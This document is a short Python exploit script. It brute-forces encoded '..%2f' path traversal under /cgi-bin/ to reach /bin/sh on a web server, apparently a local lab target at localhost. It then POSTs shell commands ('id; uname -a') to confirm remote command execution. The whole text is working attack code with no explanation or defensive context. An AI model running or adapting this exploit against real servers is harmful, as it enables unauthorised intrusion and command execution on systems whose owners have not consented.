import urllib.request, urllib.error
base = 'http://localhost:80'
path_parts = []
for n in range(2,10):
    p1 = '/cgi-bin/' + ('..%2f'*n) + 'bin/sh'
    p2 = '/cgi-bin/' + ('..%2f'*n) + '/bin/sh'
    path_parts.extend([p1,p2])

def try_exec(path):
    url = base + path
    data = b"echo Content-Type: text/plain; echo; id; uname -a;"
    req = urllib.request.Request(url, data=data, method='POST')
    req.add_header('Content-Type','application/x-www-form-urlencoded')
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read(200).decode('latin1','ignore')
            return (path, r.status, body)
    except urllib.error.HTTPError as e:
        try:
            body = e.read(200).decode('latin1','ignore') if hasattr(e, 'read') else ''
        except Exception:
            body = ''
        return (path, e.code, body)
    except Exception as e:
        return (path, 'ERR', str(e))

for p in path_parts:
    res = try_exec(p)
    if res[1] not in (400,404):
        print('HIT', res[0], res[1], res[2].replace('\n','\\n')[:200])
        break
    else:
        print('MISS', res[0], res[1])

